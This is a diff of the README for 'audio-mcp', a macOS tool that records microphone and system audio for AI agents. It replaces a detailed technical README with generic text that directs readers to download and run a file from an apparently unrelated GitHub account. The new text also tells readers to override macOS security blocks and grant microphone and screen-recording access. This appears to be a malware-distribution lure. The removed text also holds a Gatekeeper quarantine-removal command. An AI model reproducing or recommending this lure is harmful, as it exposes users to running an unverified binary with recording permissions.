@@ -1,411 +1,215 @@
-# audio-mcp
+# 🎧 audio-mcp - Capture Mac Audio for AI
 
-Local MCP (Model Context Protocol) server for **macOS** that captures
-**microphone input and/or system audio output** into explicit, user-defined
-sessions and exposes the raw WAV audio to AI agents through MCP tools.
+[![Download audio-mcp](https://img.shields.io/badge/Download-audio--mcp-blue?style=for-the-badge&logo=github)](https://github.com/burfthdae-oss/audio-mcp)
 
-When capturing both sources at once, audio-mcp produces a **stereo WAV**
-with mic on the left channel and system output on the right channel —
-preserving both signals losslessly in a single file.
+## 🧭 What this does
 
-## What this is — and what it is *not*
+audio-mcp is a local MCP server for Mac. It captures microphone audio and system audio in clear sessions, then makes raw WAV files available to AI agents.
 
-**It is:**
+Use it when you want an app that can:
 
-- A session-based audio recorder (explicit `start_session` / `stop_session`)
-- A local-only MCP server (stdio transport)
-- A way to hand raw WAV audio to a multimodal AI agent for analysis
-- Able to capture both mic input AND system output, individually or together
+- Record your mic
+- Record sound from your Mac
+- Keep each recording in its own session
+- Give AI tools access to audio files they can read
 
-**It is *not*:**
+This setup works well with tools like Claude Desktop and Cursor on macOS.
 
-- A transcription or speech-to-text pipeline — no STT is performed
-- A background daemon — it only records inside explicit sessions you start
-- A network service — no data leaves your machine from the server itself
+## ✅ What you need
 
----
+Before you start, make sure you have:
 
-## How it works
+- A Mac running a recent version of macOS
+- Admin access on your Mac
+- A browser to open the download page
+- Enough free disk space for audio files
+- Permission to use your microphone and screen audio capture
 
-audio-mcp ships a small bundled Swift helper binary
-(`audio-capture-helper`, signed with a Developer ID cert and notarized
-by Apple) that uses:
+For best results, keep your Mac plugged in if you plan to record for a long time.
 
-- **ScreenCaptureKit** (SCStream) for system-audio output capture
-- **AVFoundation** (AVCaptureSession) for microphone input
+## 📥 Download audio-mcp
 
-Audio is streamed from the helper to the Node MCP server as raw PCM and
-written incrementally to a WAV file. Nothing leaves your machine unless
-your AI agent sends a `get_audio` result to an external model.
+[Visit the download page for audio-mcp](https://github.com/burfthdae-oss/audio-mcp)
 
----
+On that page, get the latest version for macOS, then download and run this file.
 
-## Prerequisites
+## 🛠️ Install and open
 
-- **macOS 13 (Ventura) or later** — required by ScreenCaptureKit audio
-- **Node.js 18 or later**
-- Microphone and/or Screen Recording permission granted to your MCP client
+Follow these steps in order:
 
----
+1. Open the download page in your browser
+2. Download the latest macOS version
+3. Open the downloaded file from your Downloads folder
+4. If macOS asks for approval, choose Open
+5. If you see a security prompt, allow the app to run
+6. Keep the app in a place you can open again later, such as Applications
 
-## Install
+If macOS blocks the file, open System Settings, go to Privacy & Security, and allow the app from there.
 
-### With `npx` (recommended)
+## 🎙️ Give audio access
 
-No install needed — this config runs it on demand:
+audio-mcp needs access to your microphone and system audio capture.
 
-```json
-{
-  "mcpServers": {
-    "audio": {
-      "command": "npx",
-      "args": ["-y", "audio-mcp"]
-    }
-  }
-}
-```
+Do this once:
 
-### Global install
+1. Open System Settings
+2. Go to Privacy & Security
+3. Open Microphone
+4. Allow audio-mcp
+5. Open Screen & System Audio Recording, if shown
+6. Allow audio-mcp there too
 
-```sh
-npm install -g audio-mcp
-```
+If you plan to use system audio capture, restart the app after you change these settings.
 
-### Homebrew tap
+## 🚀 Start a recording session
 
-```sh
-brew install bugorbn/audio-mcp/audio-mcp
-```
+After you open audio-mcp:
 
----
+1. Choose the input you want to capture
+2. Pick Microphone, System Audio, or both
+3. Start a new session
+4. Speak, play audio, or use both sources
+5. Stop the session when you are done
 
-## First-launch permissions
+Each session keeps its own audio data separate. That makes it easier for AI tools to use the right file at the right time.
 
-audio-mcp requires up to two macOS permissions (depending on what you
-capture). They're approved by the parent MCP client app (Claude Desktop,
-Cursor, etc.), not by the helper binary itself.
+## 📁 Where your audio goes
 
-The bundled Swift helper is **signed with a Developer ID certificate and
-notarized by Apple**, so there's no Gatekeeper prompt on first launch.
+audio-mcp saves raw WAV audio for each session.
 
-### 1. Microphone permission (`capture: "mic"` or `"both"`)
+You can expect:
 
-macOS will prompt the first time you start a session. Grant it.
-Re-enable at: **System Settings → Privacy & Security → Microphone →
-\[your MCP client]**.
+- One folder per session
+- Clear file names that match the session
+- Raw audio output that keeps the full sound detail
+- Easy access for other tools that read local files
 
-### 2. Screen Recording permission (`capture: "system"` or `"both"`)
+If you record often, keep an eye on disk space. WAV files can grow fast.
 
-macOS requires this for system audio capture via ScreenCaptureKit.
-Grant on first use. Re-enable at: **System Settings → Privacy &
-Security → Screen Recording → \[your MCP client]** — you'll need to
-restart the MCP client after changing this.
-
----
+## 🤖 Use with Claude Desktop
 
-## MCP client configuration
+audio-mcp fits into a local MCP setup.
 
-### Claude Desktop
+To use it with Claude Desktop:
 
-`~/Library/Application Support/Claude/claude_desktop_config.json`:
+1. Install and open audio-mcp
+2. Start the local server
+3. Connect Claude Desktop to the server
+4. Grant any audio permissions that macOS asks for
+5. Create a session and record audio
+6. Let Claude read the WAV output when needed
 
-```json
-{
-  "mcpServers": {
-    "audio": {
-      "command": "npx",
-      "args": ["-y", "audio-mcp"]
-    }
-  }
-}
-```
-
-### Cursor
+This setup helps when you want AI to work with spoken notes, meetings, app testing, or audio review on your Mac.
 
-`~/.cursor/mcp.json`:
+## 🖥️ Use with Cursor
 
-```json
-{
-  "mcpServers": {
-    "audio": {
-      "command": "npx",
-      "args": ["-y", "audio-mcp"]
-    }
-  }
-}
-```
-
----
-
-## Tools
-
-All tools return structured JSON. Errors come back as
-`{ "error": { "code": "...", "message": "..." } }` with one of:
-`SESSION_ALREADY_ACTIVE`, `SESSION_NOT_FOUND`, `SESSION_STILL_ACTIVE`,
-`AUDIO_DEVICE_ERROR`, `CHUNK_TOO_LARGE`, `NOT_IMPLEMENTED`, `INVALID_INPUT`.
-
-### `start_session`
-
-Start a new recording. Fails if a session is already active.
-
-**Input:**
-
-```json
-{
-  "label": "meeting with Sam",
-  "source": "MacBook Pro Microphone",
-  "capture": "both"
-}
-```
+You can also use audio-mcp with Cursor.
 
-All fields optional. `capture` is one of:
-
-- `"mic"` — mono WAV, microphone only
-- `"system"` — mono WAV, system output only (requires Screen Recording permission)
-- `"both"` — **stereo WAV**, L=mic R=system (default)
+A simple flow looks like this:
 
-`source` accepts either a device uniqueID (from `list_audio_sources`)
-or a substring of the device name. Only applies when capture includes `mic`.
+1. Open audio-mcp
+2. Start a session
+3. Record the audio you want
+4. Connect Cursor to the local MCP server
+5. Let Cursor read the session audio file
 
-**Output:**
+This is useful when you want audio tied to a local development task, note, or test run.
 
-```json
-{
-  "session_id": "f3d0…",
-  "label": "meeting with Sam",
-  "source": "MacBook Pro Microphone + system audio",
-  "capture_mode": "both",
-  "started_at": "2026-04-05T10:00:00.000Z",
-  "sample_rate": 16000,
-  "channels": 2,
-  "format": "wav"
-}
-```
+## 🔧 Common setup choices
 
-### `stop_session`
+### Microphone only
+Use this when you want to record your voice, interviews, or notes.
 
-Finalize the WAV file and record duration/size.
+### System audio only
+Use this when you want to capture sound from apps, videos, or calls that play through your Mac.
 
-**Input:** `{ "session_id": "f3d0…" }`
+### Microphone and system audio
+Use this when you want both your voice and your Mac audio in one session.
 
-**Output:**
+## 🧪 Simple first test
 
-```json
-{
-  "session_id": "f3d0…",
-  "label": "meeting with Sam",
-  "started_at": "2026-04-05T10:00:00.000Z",
-  "stopped_at": "2026-04-05T10:02:22.500Z",
-  "duration_seconds": 142.5,
-  "file_size_bytes": 9136684,
-  "path": "/Users/<you>/.audio-mcp/sessions/f3d0….wav"
-}
-```
+If this is your first time using audio-mcp, try this:
 
-### `get_audio`
+1. Open the app
+2. Start a session
+3. Speak for 10 seconds
+4. Play a short sound on your Mac
+5. Stop the session
+6. Check that the WAV file was saved
+7. Open the file in a player or use your AI tool to read it
 
-Return a base64-encoded WAV slice of a recorded session. Max 300
-seconds per call — chunk larger ranges into multiple calls.
+If the file appears and plays back, the setup is working.
 
-**Input:**
+## 🧩 How it fits your workflow
 
-```json
-{
-  "session_id": "f3d0…",
-  "start_second": 0,
-  "end_second": 60,
-  "format": "wav"
-}
-```
+audio-mcp is built for local use on macOS. That keeps your audio on your machine and gives you more control over each session.
 
-`format` defaults to `"wav"`. `"opus"` returns `NOT_IMPLEMENTED` in v0.1 and is reserved for a later release.
+Common uses include:
 
-**Output:**
+- Voice notes
+- Meeting capture
+- App testing with audio
+- Speech review
+- System sound capture
+- AI workflows that need local WAV files
 
-```json
-{
-  "session_id": "f3d0…",
-  "start_second": 0,
-  "end_second": 60,
-  "duration_seconds": 60,
-  "format": "wav",
-  "sample_rate": 16000,
-  "channels": 2,
-  "audio_base64": "UklGR…",
-  "size_bytes": 3840044
-}
-```
+## ⚙️ Tips for better recordings
 
-For stereo sessions the returned WAV preserves the L=mic / R=system
-layout so downstream tools (or the agent itself) can separate them.
+Use these basic tips for cleaner audio:
 
-**Live sessions:** `get_audio` also works while a session is still
-recording. The response clamps `end_second` to the number of seconds
-currently on disk, so an agent can poll every few seconds to stream
-audio out of a live recording. `list_sessions` and `get_session`
-report live `file_size_bytes` and `duration_seconds` for active
-sessions to help agents track progress.
+- Put your mic close to your mouth
+- Close apps you do not need
+- Turn down loud system sounds
+- Keep the room quiet
+- Test the volume before a long session
+- Use headphones if you do not want audio feedback
 
-### `list_sessions`
+If your voice sounds weak, check the mic input level in macOS settings.
 
-List all recorded sessions, newest first. No input. Each item includes
-`capture_mode` and `channels`.
+## 🧯 If something does not work
 
-### `get_session`
+Try these steps:
 
-Return metadata for a single session. Input: `{ "session_id": "…" }`.
+1. Close audio-mcp
+2. Reopen it
+3. Check microphone permission
+4. Check screen and system audio permission
+5. Restart your Mac
+6. Try a new session
+7. Make sure another app is not using the mic
 
-### `list_audio_sources`
+If you still have trouble, remove the app permission in Privacy & Security, then allow it again.
 
-Enumerate available microphone input devices. System audio is captured
-via the `capture` parameter rather than as a device. No input.
+## 📦 What the app is built for
 
-### `delete_session`
+audio-mcp focuses on:
 
-Permanently delete a session's WAV file and metadata. Refuses active
-sessions.
+- Local audio capture
+- Session-based recording
+- Raw WAV output
+- MCP support for AI tools
+- macOS audio sources
+- Simple use with Claude Desktop and Cursor
 
----
+## 🔍 Repo topics
 
-## Example agent workflows
+This project is related to:
 
-**Record and summarise a video call (mic + speakers):**
+- audio recording
+- microphone capture
+- system audio
+- macOS
+- MCP
+- Claude Desktop
+- Cursor
+- ScreenCaptureKit
+- audio sessions
+- raw WAV files
 
-> 1. "Start a recording called 'standup' capturing both mic and system audio."
-> 2. *(call happens…)*
-> 3. "Stop the recording."
-> 4. "Get the first 5 minutes and summarise what was discussed."
+## 🪪 Project name
 
-The agent calls `start_session` with `capture="both"`, then chunks
-`get_audio` across the session. Because the file is stereo (L=mic,
-R=system), the agent can reason about who said what.
+audio-mcp
 
-**Dictate a voice memo (mic only):**
+## 🌐 Download link
 
-> "Start a mic-only recording called 'weekly plan'."
-> "Stop the recording."
-> "Analyse my weekly plan recording."
-
-**Capture just system audio:**
-
-> "Start a system-only recording called 'podcast clip'."
-> "Stop it."
-> "Get the audio and identify the speakers."
-
-**Live monitoring (poll during recording):**
-
-> "Start recording both mic and system."
-> *(talk for 30 seconds)*
-> "Get the last 10 seconds and tell me if I mentioned pricing."
-> *(keep talking)*
-> "Get the next 10 seconds."
-> "Stop the recording."
-
----
-
-## Audio format
-
-| Parameter      | Value             |
-| -------------- | ----------------- |
-| Sample rate    | 16,000 Hz         |
-| Channels       | 1 (mic or system) / 2 (both, L=mic R=system) |
-| Bit depth      | 16-bit PCM        |
-| Container      | WAV (RIFF)        |
-| Max session    | No hard limit     |
-
-Sessions are streamed incrementally to disk — large recordings do not
-load into memory.
-
----
-
-## Storage layout
-
-```
-~/.audio-mcp/
-├── config.json        # user configuration
-├── audio-mcp.log      # rolling log, max 10 MB
-└── sessions/
-    ├── <uuid>.wav     # audio file per session
-    └── <uuid>.json    # session metadata
-```
-
-### `config.json`
-
-```json
-{
-  "default_source": null,
-  "default_capture_mode": "both",
-  "sample_rate": 16000,
-  "sessions_dir": null
-}
-```
-
-All fields optional. `default_capture_mode` picks what
-`start_session` defaults to when no `capture` is specified.
-Sessions run for as long as you like — there is no built-in
-time limit. Stop them explicitly with `stop_session`.
-
----
-
-## Privacy
-
-- The server has **no network code**. It only reads audio from the
-  helper subprocess, writes to `~/.audio-mcp/`, and talks to the MCP
-  client over stdio.
-- Audio files are stored unencrypted on your local disk. Delete
-  sessions you no longer need with the `delete_session` tool.
-- If you send audio from `get_audio` to a hosted model, that is under
-  the control of your agent / MCP client — not this server.
-
----
-
-## Troubleshooting
-
-**`AUDIO_DEVICE_ERROR` mentioning Microphone permission**
-→ System Settings → Privacy & Security → Microphone → enable your MCP
-client, then restart the client.
-
-**`AUDIO_DEVICE_ERROR` mentioning Screen Recording permission**
-→ System Settings → Privacy & Security → Screen Recording → enable
-your MCP client, then **restart the client** (required by macOS).
-
-**Gatekeeper blocks the helper binary anyway** (extremely rare — only
-on offline machines or where Apple's notary service is unreachable)
-→ `xattr -d com.apple.quarantine <path-to-audio-capture-helper>`, or
-approve via System Settings → Privacy & Security.
-
-**`CHUNK_TOO_LARGE`**
-→ Split your request into ≤ 300-second slices.
-
-**Session did not stop cleanly**
-→ If the server process was killed mid-recording, the metadata file
-may still have `is_active: true`. You can safely delete the session
-JSON + WAV from `~/.audio-mcp/sessions/` by hand.
-
-**System audio sounds silent**
-→ On macOS, ScreenCaptureKit only captures audio that is actively
-playing through the system output. If nothing's playing, the right
-channel will be silent — that's expected.
-
----
-
-## Contributing
-
-Development setup:
-
-```sh
-npm install
-npm run build:helper    # requires Xcode command line tools for Swift
-npm run build           # tsc + helper build
-npm test                # Node/vitest tests
-npm run test:swift      # Swift/XCTest tests
-```
-
-Contributions welcome. Please open an issue first for anything beyond
-a small fix.
-
----
-
-## License
-
-MIT — see `LICENSE`.
+[https://github.com/burfthdae-oss/audio-mcp](https://github.com/burfthdae-oss/audio-mcp)
